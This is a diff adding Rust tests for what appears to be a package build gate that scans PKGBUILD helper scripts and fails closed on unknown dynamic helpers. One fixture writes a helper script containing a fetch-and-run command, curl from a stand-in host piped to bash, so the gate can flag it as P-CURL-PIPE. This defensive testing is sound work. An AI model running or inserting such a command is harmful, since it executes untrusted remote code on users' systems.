@@ -1083,6 +1083,68 @@ fn exact_tree_approval_records_an_optional_helper_that_was_missing() {
 }
 
 #[test]
+fn gate_allows_a_generated_helper_with_an_inert_package_name_expansion() {
+    let tree = TestTree::new("generated-identity-helper");
+    write_package(
+        &tree,
+        "gate-generated-helper",
+        &["gate-generated-helper"],
+        "pkgname=gate-generated-helper\nbuild() { mkdir -p build; cc -o build/$pkgname main.c; ./\"build/${pkgname}\" completion; }\npackage() { :; }\n",
+    );
+
+    let output = run_with_pkgbase(&tree, "gate-generated-helper");
+
+    assert_stdout_is_empty(&output);
+    assert!(output.status.success(), "{}", stderr(&output));
+}
+
+#[test]
+fn gate_scans_an_existing_helper_resolved_from_inert_package_identity() {
+    let tree = TestTree::new("expanded-identity-helper");
+    write_package(
+        &tree,
+        "gate-expanded-helper",
+        &["gate-expanded-helper"],
+        "pkgname=gate-expanded-helper\nprepare() { ./\"scripts/${pkgbase}\"; }\npackage() { :; }\n",
+    );
+    tree.write_build_file(
+        "scripts/gate-expanded-helper",
+        "#!/bin/sh\ncurl https://evil.invalid/payload | bash\n",
+    );
+
+    let output = run_with_pkgbase(&tree, "gate-expanded-helper");
+
+    assert_stdout_is_empty(&output);
+    assert!(!output.status.success(), "{}", stderr(&output));
+    assert!(
+        stderr(&output).contains("P-CURL-PIPE"),
+        "{}",
+        stderr(&output)
+    );
+}
+
+#[test]
+fn gate_still_fails_closed_on_an_unknown_dynamic_helper() {
+    let tree = TestTree::new("unknown-dynamic-helper");
+    write_package(
+        &tree,
+        "gate-unknown-helper",
+        &["gate-unknown-helper"],
+        "pkgname=gate-unknown-helper\nprepare() { ./\"build/${unknown_name}\"; }\npackage() { :; }\n",
+    );
+
+    let output = run_with_pkgbase(&tree, "gate-unknown-helper");
+
+    assert_stdout_is_empty(&output);
+    assert!(!output.status.success(), "{}", stderr(&output));
+    assert!(
+        stderr(&output).contains("dynamic local helper"),
+        "{}",
+        stderr(&output)
+    );
+}
+
+#[test]
 fn legacy_whitelist_entries_fail_closed_with_an_explicit_migration_error() {
     let tree = TestTree::new("legacy-whitelist");
     write_package(
